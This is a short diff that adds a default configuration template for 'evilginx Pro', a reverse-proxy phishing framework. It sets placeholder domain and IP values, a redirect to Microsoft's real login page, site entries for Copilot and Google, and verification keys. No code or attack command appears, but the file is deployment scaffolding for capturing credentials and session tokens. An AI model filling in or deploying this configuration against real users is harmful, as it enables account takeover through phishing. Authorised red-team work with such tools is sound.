@@ -1,0 +1,17 @@
+# GINX evilginx Pro — default config template
+# Deployer patches {DOMAIN} and {IP} per deployment
+
+adminpage_path: "4271"
+blacklist_mode: "off"
+ip: "{IP}"
+lures: []
+redirect_key: qo
+redirect_url: "https://login.microsoftonline.com/common/login"
+server: "{DOMAIN}"
+site_domains:
+    copilot: ""
+    google: ""
+sites_enabled: []
+url_rewrite_enabled: false
+verification_key: oz
+verification_token: 1b18
